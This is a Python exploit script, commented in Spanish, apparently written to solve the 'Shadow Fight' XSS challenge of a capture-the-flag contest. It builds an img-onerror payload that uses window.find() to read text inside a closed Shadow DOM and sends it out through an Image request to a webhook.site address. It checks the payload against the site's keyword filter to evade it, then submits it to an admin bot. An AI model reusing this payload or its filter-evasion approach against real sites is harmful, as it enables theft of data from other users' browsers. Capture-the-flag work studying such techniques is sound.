#!/usr/bin/env python3
"""
Shadow Fight - Pragyan CTF 2026
================================

Reto: XSS + Closed Shadow DOM bypass
URL: https://shadow-fight.ctf.prgy.in/

Vulnerabilidades:
-----------------
1. XSS en parámetro 'name' que se inyecta vía innerHTML
2. Shadow DOM en modo 'closed' contiene la flag (solo visible para el admin)
3. Admin bot visita perfiles enviados vía POST a /review

Técnica de Bypass:
------------------
- window.find(text) NO respeta los límites del Shadow DOM cerrado
- Puede buscar y seleccionar texto dentro del shadow DOM
- getSelection().anchorNode.textContent devuelve el contenido completo del nodo

Filtros a Bypassear:
--------------------
isSafe() bloquea: ", \n, \r, fetch, XMLHttpRequest, navigator, sendBeacon,
postMessage, location, document, window, Function, constructor, import,
__proto__, prototype, escape, from, char, atob, btoa, hex escapes

Solución:
---------
1. Usar window.find() para seleccionar texto en el Shadow DOM
2. Extraer el textContent del nodo seleccionado
3. Exfiltrar vía Image().src al webhook

Referencias:
------------
- DiceCTF 2022 "shadow" challenge (similar technique)
- https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md
"""

import requests
from urllib.parse import quote
import time
import sys

def create_payload(webhook_id):
    """
    Crea el payload de explotación.

    El payload:
    1. Busca patrones comunes en el Shadow DOM usando window.find()
    2. Extrae el textContent completo del nodo que contiene la flag
    3. Exfiltra vía imagen al webhook
    """

    # Payload optimizado que busca múltiples patrones y extrae textContent
    # Usando comillas simples dentro del string para evitar escape issues
    payload = "<img src=x onerror='"
    payload += "let patterns=[`p_ctf`,`pragma`,`flag`,`admin`,`secret`];"
    payload += "for(let p of patterns){"
    payload += "if(self.find(p)){"
    payload += "let s=self.getSelection();"
    payload += "if(s&&s.anchorNode){"
    payload += "let txt=s.anchorNode.textContent||s.anchorNode.data||s.toString();"
    payload += "if(txt&&txt.includes(`{`)){"
    payload += f"new Image().src=`https://webhook.site/{webhook_id}?flag=`+encodeURI(txt);"
    payload += "break;"
    payload += "}}}}}"
    payload += "'>"

    return payload

def validate_payload(payload):
    """Valida que el payload no contenga palabras bloqueadas."""
    blocked = [
        '"', '\n', '\r', 'fetch', 'XMLHttpRequest', 'navigator', 'sendBeacon',
        'postMessage', 'location', 'document', 'window', 'Function',
        'constructor', 'import', '__proto__', 'prototype', 'escape',
        'from', 'char', 'atob', 'btoa'
    ]

    for word in blocked:
        if word.lower() in payload.lower():
            return False, word

    if '%0a' in payload.lower() or '%0d' in payload.lower():
        return False, 'newline_encoded'

    if '\\x' in payload.lower():
        return False, 'hex_escape'

    return True, None

def send_to_admin(payload, avatar="https://picsum.photos/100/100"):
    """Envía el payload al admin bot."""
    url = f"https://shadow-fight.ctf.prgy.in/review?name={quote(payload)}&avatar={quote(avatar)}"

    try:
        r = requests.post(url, timeout=10)
        return r.status_code == 200, r.text
    except Exception as e:
        return False, str(e)

def main():
    print("Shadow Fight - Exploit Final")
    print("Pragyan CTF 2026")
    print()

    # Webhook ID (cambiar por el tuyo)
    WEBHOOK_ID = "b38270ad-3655-4935-903c-eca8ec65f39c"

    if len(sys.argv) > 1:
        WEBHOOK_ID = sys.argv[1]

    print(f"Webhook: https://webhook.site/{WEBHOOK_ID}")
    print()

    # Crear payload
    print("[1] Creando payload...")
    payload = create_payload(WEBHOOK_ID)
    print(f"Payload: {payload[:100]}...")
    print()

    # Validar
    print("[2] Validando payload...")
    valid, blocked_word = validate_payload(payload)
    if not valid:
        print(f"Payload bloqueado por: {blocked_word}")
        return 1
    print("Payload válido (bypasea todos los filtros)")
    print()

    # Enviar
    print("[3] Enviando al admin bot...")
    success, response = send_to_admin(payload)
    if success:
        print(f"Enviado exitosamente")
        print(f"Respuesta: {response}")
    else:
        print(f"Error: {response}")
        return 1
    print()

    # Instrucciones
    print("Siguiente paso:")
    print()
    print(f"1. Abre el webhook: https://webhook.site/{WEBHOOK_ID}")
    print("2. Espera 1-5 minutos a que el admin bot visite tu perfil")
    print("3. Busca un request con el parámetro 'flag' que contenga la flag")
    print()
    print("Notas:")
    print("- El admin bot puede tener rate limiting")
    print("- Si no recibes nada en 5 minutos, reintenta")
    print("- La flag debería tener formato: p_ctf{...}")
    print()
    print("Si obtienes la flag, guárdala con:")
    print("  echo 'Shadow Fight: p_ctf{...}' >> /root/ctf/flags.txt")
    print()

    return 0

if __name__ == "__main__":
    sys.exit(main())
